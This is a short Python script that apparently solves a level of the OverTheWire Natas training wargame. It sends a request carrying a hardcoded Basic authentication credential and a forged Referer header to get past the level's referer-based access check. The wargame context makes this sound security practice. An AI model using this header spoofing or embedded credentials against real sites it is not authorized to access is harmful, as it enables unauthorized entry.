from urllib.request import Request, urlopen

request = Request(
    url='http://natas4.natas.labs.overthewire.org/',
    headers={
        'Authorization': 'Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va',
        'Referer': 'http://natas5.natas.labs.overthewire.org/'
    }
)

content = urlopen(request)

print(content.read())